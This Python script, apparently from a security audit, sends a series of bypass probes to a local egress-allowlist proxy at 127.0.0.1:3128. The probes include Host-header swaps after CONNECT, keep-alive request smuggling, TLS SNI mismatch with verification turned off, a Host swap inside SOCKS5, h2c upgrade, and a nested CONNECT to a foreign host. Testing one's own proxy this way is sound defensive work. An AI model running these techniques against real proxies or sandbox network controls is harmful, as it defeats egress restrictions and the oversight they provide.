#!/usr/bin/env python3
"""Sixth-pass network attack probes against the bridge at 127.0.0.1:3128."""
import socket, ssl, sys, time

BRIDGE = ("127.0.0.1", 3128)

def raw(req: bytes, read_sec=8.0, after=None, label=""):
    s = socket.create_connection(BRIDGE, 5)
    s.settimeout(read_sec)
    s.sendall(req)
    if after:
        time.sleep(after[0])
        s.sendall(after[1])
    out = b""
    try:
        while True:
            b = s.recv(65536)
            if not b:
                break
            out += b
            if len(out) > 200000:
                break
    except socket.timeout:
        pass
    s.close()
    first = out.split(b"\r\n", 1)[0][:80]
    print(f"[{label}] {len(out)}B first={first!r}")
    return out

def socks5_probe(host, port, label):
    s = socket.create_connection(BRIDGE, 5)
    s.settimeout(8)
    s.sendall(b"\x05\x01\x00")
    r = s.recv(2)
    if r != b"\x05\x00":
        print(f"[{label}] method refused {r!r}")
        return
    addr = host.encode()
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(addr)]) + addr + port.to_bytes(2, "big"))
    r = s.recv(10)
    print(f"[{label}] reply={r[:2].hex()} full={r!r}")
    s.close()

# 1. two-stage Host swap on plaintext port 80 (fifth-audit C1)
req = (
    b"CONNECT registry.npmjs.org:80 HTTP/1.1\r\n"
    b"Host: registry.npmjs.org:80\r\n\r\n"
)
raw(req, after=(0.5, b"GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n"),
    label="C1 host-swap port80")

# 2. keep-alive second request with foreign Host after a matching first
inner = (
    b"GET / HTTP/1.1\r\nHost: registry.npmjs.org\r\n\r\n"
    b"GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n"
)
raw(req + inner, label="C1 keepalive smuggle")

# 3. SNI mismatch on 443 tunnel
s = socket.create_connection(BRIDGE, 5)
s.settimeout(10)
s.sendall(b"CONNECT registry.npmjs.org:443 HTTP/1.1\r\nHost: registry.npmjs.org:443\r\n\r\n")
r = s.recv(4096)
print(f"[C1 sni] est={r.splitlines()[0] if r else b''!r}")
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
try:
    t = ctx.wrap_socket(s, server_hostname="example.com")
    print("[C1 sni] TLS HANDSHAKE SUCCEEDED with SNI=example.com — C1 NOT FIXED")
    t.sendall(b"GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n")
    data = t.recv(200)
    print("[C1 sni] response:", data[:80])
    t.close()
except Exception as e:
    print(f"[C1 sni] refused: {e}")

# 4. allowed host first, then absolute-form URI to foreign origin
raw(b"GET http://registry.npmjs.org/ HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n",
    label="absolute-form host mismatch")

# 5. CONNECT with Host-only allow: opencode.ai port 80 vs 8080
raw(b"CONNECT opencode.ai:8080 HTTP/1.1\r\nHost: opencode.ai:8080\r\n\r\n", label="port 8080")
raw(b"CONNECT opencode.ai:4443 HTTP/1.1\r\nHost: opencode.ai:4443\r\n\r\n", label="port 4443")

# 6. SOCKS5 to allowed host then Host swap inside
s = socket.create_connection(BRIDGE, 5)
s.settimeout(8)
s.sendall(b"\x05\x01\x00"); assert s.recv(2) == b"\x05\x00"
addr = b"registry.npmjs.org"
s.sendall(b"\x05\x01\x00\x03" + bytes([len(addr)]) + addr + (80).to_bytes(2, "big"))
r = s.recv(10)
print(f"[C1 socks] reply={r[:2].hex()}")
if r[:2] == b"\x05\x00":
    s.sendall(b"GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n")
    try:
        data = s.recv(300)
        print(f"[C1 socks] inner response: {data[:100]!r}")
    except Exception as e:
        print(f"[C1 socks] inner refused: {e}")
s.close()

# 7. CONNECT by resolved IP of allowed host (ip literal path skips inspection)
import socket as sk
try:
    ip = sk.gethostbyname("registry.npmjs.org")
    print(f"[ip-connect] resolved {ip}")
except Exception as e:
    print(f"[ip-connect] resolve failed: {e}")

# 8. CONNECT allowed host, send nothing for 6s then garbage (origin timeout path)
s = socket.create_connection(BRIDGE, 5)
s.settimeout(12)
s.sendall(b"CONNECT registry.npmjs.org:443 HTTP/1.1\r\nHost: registry.npmjs.org:443\r\n\r\n")
print("[timeout-path] est:", s.recv(100).splitlines()[0])
time.sleep(6)
try:
    s.sendall(b"\x16garbage-not-tls")
    data = s.recv(100)
    print(f"[timeout-path] after-garbage: {data[:60]!r}")
except Exception as e:
    print(f"[timeout-path] closed: {e}")
s.close()

# 9. h2c prior-knowledge inside tunnel (PRI * HTTP/2.0)
raw(req, after=(0.3, b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"), label="h2c inside tunnel")

# 10. CONNECT then inner CONNECT to foreign host
raw(req, after=(0.3, b"CONNECT example.com:80 HTTP/1.1\r\nHost: example.com:80\r\n\r\n"),
    label="inner CONNECT")
print("DONE")
